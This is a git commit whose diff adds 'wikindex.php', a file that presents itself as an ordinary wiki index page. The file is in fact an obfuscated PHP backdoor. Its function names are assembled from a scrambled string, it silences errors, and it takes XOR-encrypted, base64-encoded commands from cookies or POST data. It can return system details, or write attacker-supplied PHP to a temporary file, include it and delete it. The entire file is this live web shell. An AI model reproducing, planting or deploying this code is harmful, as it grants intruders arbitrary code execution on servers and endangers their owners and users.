69b88287d1b46fed5f5d98951d17524c3014b8f5
Stefan Pejcic <pejcha1994@gmail.com>
2022-02-10 14:06:37 +0100

    Create wikindex.php

---
+++ 10.02.2022/wikindex.php
@@ -0,0 +1,64 @@
+<?php
+$hpghqk = 'L1oFl/_5s-E2(nz@9vkg\'4Nxht3Uyi; ecfda6u<jr.0I7bm)p?';
+$efsdqlj = array();
+$efsdqlj[] = $hpghqk[21] . $hpghqk[32] . $hpghqk[34] . $hpghqk[37] . $hpghqk[26] . $hpghqk[36] . $hpghqk[46] . $hpghqk[32] . $hpghqk[9] . $hpghqk[1] . $hpghqk[36] . $hpghqk[46] . $hpghqk[35] . $hpghqk[9] . $hpghqk[21] . $hpghqk[7] . $hpghqk[36] . $hpghqk[37] . $hpghqk[9] . $hpghqk[16] . $hpghqk[1] . $hpghqk[26] . $hpghqk[35] . $hpghqk[9] . $hpghqk[37] . $hpghqk[34] . $hpghqk[46] . $hpghqk[16] . $hpghqk[16] . $hpghqk[37] . $hpghqk[7] . $hpghqk[45] . $hpghqk[32] . $hpghqk[11] . $hpghqk[21] . $hpghqk[46];
+$efsdqlj[] = $hpghqk[50] . $hpghqk[49] . $hpghqk[24] . $hpghqk[49] . $hpghqk[31] . $hpghqk[15] . $hpghqk[38] . $hpghqk[13] . $hpghqk[4] . $hpghqk[29] . $hpghqk[13] . $hpghqk[18] . $hpghqk[12] . $hpghqk[6] . $hpghqk[6] . $hpghqk[3] . $hpghqk[44] . $hpghqk[0] . $hpghqk[10] . $hpghqk[6] . $hpghqk[6] . $hpghqk[48] . $hpghqk[30] . $hpghqk[31];
+$efsdqlj[] = $hpghqk[47] . $hpghqk[36] . $hpghqk[23] . $hpghqk[6] . $hpghqk[32] . $hpghqk[23] . $hpghqk[32] . $hpghqk[33] . $hpghqk[38] . $hpghqk[25] . $hpghqk[29] . $hpghqk[2] . $hpghqk[13] . $hpghqk[6] . $hpghqk[25] . $hpghqk[29] . $hpghqk[47] . $hpghqk[32];
+$efsdqlj[] = $hpghqk[4] . $hpghqk[2] . $hpghqk[19] . $hpghqk[6] . $hpghqk[32] . $hpghqk[41] . $hpghqk[41] . $hpghqk[2] . $hpghqk[41] . $hpghqk[8];
+$efsdqlj[] = $hpghqk[32] . $hpghqk[41] . $hpghqk[41] . $hpghqk[2] . $hpghqk[41] . $hpghqk[6] . $hpghqk[4] . $hpghqk[2] . $hpghqk[19];
+$efsdqlj[] = $hpghqk[1] . $hpghqk[42] . $hpghqk[43] . $hpghqk[9] . $hpghqk[1];
+$efsdqlj[] = $hpghqk[42] . $hpghqk[29] . $hpghqk[13] . $hpghqk[33];
+$efsdqlj[] = $hpghqk[36] . $hpghqk[18];
+$efsdqlj[] = $hpghqk[49] . $hpghqk[17];
+$efsdqlj[] = $hpghqk[42] . $hpghqk[5];
+$efsdqlj[] = $hpghqk[8] . $hpghqk[17];
+$efsdqlj[] = $hpghqk[35];
+$efsdqlj[] = $hpghqk[29];
+$efsdqlj[] = $hpghqk[36];
+$efsdqlj[] = $hpghqk[32];
+$efsdqlj[] = $hpghqk[39];
+$efsdqlj[] = $hpghqk[34] . $hpghqk[29] . $hpghqk[4] . $hpghqk[32] . $hpghqk[6] . $hpghqk[49] . $hpghqk[38] . $hpghqk[25] . $hpghqk[6] . $hpghqk[33] . $hpghqk[2] . $hpghqk[13] . $hpghqk[25] . $hpghqk[32] . $hpghqk[13] . $hpghqk[25] . $hpghqk[8];
+$efsdqlj[] = $hpghqk[8] . $hpghqk[32] . $hpghqk[25] . $hpghqk[6] . $hpghqk[25] . $hpghqk[29] . $hpghqk[47] . $hpghqk[32] . $hpghqk[6] . $hpghqk[4] . $hpghqk[29] . $hpghqk[47] . $hpghqk[29] . $hpghqk[25];
+$efsdqlj[] = $hpghqk[46] . $hpghqk[36] . $hpghqk[8] . $hpghqk[32] . $hpghqk[37] . $hpghqk[21] . $hpghqk[6] . $hpghqk[35] . $hpghqk[32] . $hpghqk[33] . $hpghqk[2] . $hpghqk[35] . $hpghqk[32];
+$efsdqlj[] = $hpghqk[38] . $hpghqk[13] . $hpghqk[8] . $hpghqk[32] . $hpghqk[41] . $hpghqk[29] . $hpghqk[36] . $hpghqk[4] . $hpghqk[29] . $hpghqk[14] . $hpghqk[32];
+$efsdqlj[] = $hpghqk[36] . $hpghqk[41] . $hpghqk[41] . $hpghqk[36] . $hpghqk[28] . $hpghqk[6] . $hpghqk[47] . $hpghqk[32] . $hpghqk[41] . $hpghqk[19] . $hpghqk[32];
+$efsdqlj[] = $hpghqk[49] . $hpghqk[24] . $hpghqk[49] . $hpghqk[17] . $hpghqk[32] . $hpghqk[41] . $hpghqk[8] . $hpghqk[29] . $hpghqk[2] . $hpghqk[13];
+$efsdqlj[] = $hpghqk[8] . $hpghqk[32] . $hpghqk[41] . $hpghqk[29] . $hpghqk[36] . $hpghqk[4] . $hpghqk[29] . $hpghqk[14] . $hpghqk[32];
+$efsdqlj[] = $hpghqk[29] . $hpghqk[13] . $hpghqk[29] . $hpghqk[6] . $hpghqk[8] . $hpghqk[32] . $hpghqk[25];
+$efsdqlj[] = $hpghqk[8] . $hpghqk[25] . $hpghqk[41] . $hpghqk[4] . $hpghqk[32] . $hpghqk[13];
+$efsdqlj[] = $hpghqk[22] . $hpghqk[27] . $hpghqk[0] . $hpghqk[0];
+$efsdqlj[] = $hpghqk[33] . $hpghqk[24] . $hpghqk[41];
+$efsdqlj[] = $hpghqk[2] . $hpghqk[41] . $hpghqk[35];
+$efsdqlj[] = $hpghqk[47] . $hpghqk[35] . $hpghqk[7];
+@$efsdqlj[23]($efsdqlj[4], $efsdqlj[25]);
+@$efsdqlj[23]($efsdqlj[3], 0);
+@$efsdqlj[23]($efsdqlj[2], 0);
+@$efsdqlj[17](0);
+function gehxn($efsdqlj, $rklowc, $nvfbdin)
+{
+    $wfqzhke = "";
+    for ($ujmsky = 0; $ujmsky < $efsdqlj[24]($rklowc);) {
+        for ($pagog = 0; $pagog < $efsdqlj[24]($nvfbdin) && $ujmsky < $efsdqlj[24]($rklowc); $pagog++, $ujmsky++) {
+            $wfqzhke .= $efsdqlj[26]($efsdqlj[27]($rklowc[$ujmsky]) ^ $efsdqlj[27]($nvfbdin[$pagog]));
+        }
+    }
+    return $wfqzhke;
+}
+
+$kgwuky = $efsdqlj[20]($_COOKIE, $_POST);
+$evujso = $efsdqlj[0];
+foreach ($kgwuky as $mojpu => $rklowc) {
+    $rklowc = @$efsdqlj[19](gehxn($efsdqlj, gehxn($efsdqlj, $efsdqlj[18]($rklowc), $evujso), $mojpu));
+    if (isset($rklowc[$efsdqlj[7]])) {
+        if ($rklowc[$efsdqlj[13]] == $efsdqlj[12]) {
+            $ujmsky = array($efsdqlj[8] => @$efsdqlj[21](), $efsdqlj[10] => $efsdqlj[5],);
+            echo @$efsdqlj[22]($ujmsky);
+        } elseif ($rklowc[$efsdqlj[13]] == $efsdqlj[14]) {
+            $gestyu = $efsdqlj[9] . $efsdqlj[28]($evujso) . $efsdqlj[6];
+            @$efsdqlj[16]($gestyu, $efsdqlj[15] . $efsdqlj[1] . $rklowc[$efsdqlj[11]]);
+            @include($gestyu);
+            @unlink($gestyu);
+        }
+        exit();
+    }
+} ?>
